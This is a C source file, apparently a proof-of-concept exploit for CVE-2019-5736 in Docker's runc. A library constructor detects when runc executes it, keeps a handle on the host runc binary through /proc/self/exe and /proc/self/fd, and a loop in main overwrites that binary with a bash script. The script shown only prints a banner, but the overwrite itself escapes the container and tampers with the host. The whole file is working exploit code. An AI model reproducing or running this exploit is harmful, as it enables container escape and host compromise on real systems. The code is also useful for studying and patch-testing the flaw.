#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/signal.h>
#include "libseccomp_symbols.c"

void run_as_lib(void)
{
	char buf[100];
	int exe_name_len=0;

	if((exe_name_len=readlink("/proc/self/exe", buf, 99))>0)
	{
		buf[exe_name_len] = '\0';
		printf("/proc/self/exe ==> %s\n", buf);
		if(strcmp(buf, "/usr/bin/docker-runc") == 0 || 
			strcmp(buf, "/usr/sbin/docker-runc") == 0 || 
			strcmp(buf, "/usr/libexec/docker/docker-runc-current") == 0)
		{
			// try to open file with O_RDONLY
			int fd = 0;
			if((fd = open("/proc/self/exe", O_RDONLY))<0)
				perror("open /proc/self/exe with O_RDONLY error");

			if(fd != -1)
			{	
				char tmp[50];
				sprintf(tmp, "/proc/self/fd/%d", fd);
				printf("\nOpened with fd: %s\n", tmp);

				// 1. Exec '/bin/run' will link /proc/self/exe to /bin/run instead of runc, making runc writable
				// 2. Also, the file descriptors will pass on to the new process
				// Finally, the new process can overwrite runc by the '/proc/self/fd/*'
				execl("/bin/run", "/bin/run", tmp, NULL);
			}
		}
		else if(strncmp(buf, "/memfd:runc_cloned:/proc/self/exe", 18) == 0)
			printf("Already the new runc using memfd, not exploitable, quitting");
		else
			printf("/proc/self/exe is no runc, skip...");
	}
	else
		perror("Readlink Error");

	exit(0);

}
void __attribute__((constructor)) myinit(int argc, char **argv)
{
	// if run as /bin/run, then we should skip the run_as_lib(),
	// and the ld will call main() next.
	if(strcmp(argv[0], "/bin/run")==0)
		return;
	else
		run_as_lib();
}


int main(int argc, char **argv)
{
	char *fdpath = argv[1];
	char buf[] = "#!/bin/bash\n\
echo -e '\\n\\n\\n\\n\\r\
========================================\\n\\r\
=====  Exploit for CVE-2019-5736   =====\\n\\r\
=====  @Author github:kings-way    =====\\n\\r\
=====  @Date 20190212              =====\\n\\r\
========================================\\n\\r\
\n\n\n\\n\\r' > /proc/self/fd/1\n\
exit -1\n\0";

	int fd=0;
	while(1)
	{
		if( (fd = open(fdpath, O_WRONLY)) == -1)
			perror("Open with O_WRONLY Error");
		else if(write(fd, buf, strlen(buf)) == -1)
			perror("Write runC Error");
		else
		{
			printf("LOL! Write runC Success, quitting in 2 seconds\n");
			break;
		}
		close(fd);
		// sleep 200ms
		usleep(200000);
	}
	return 0;
}

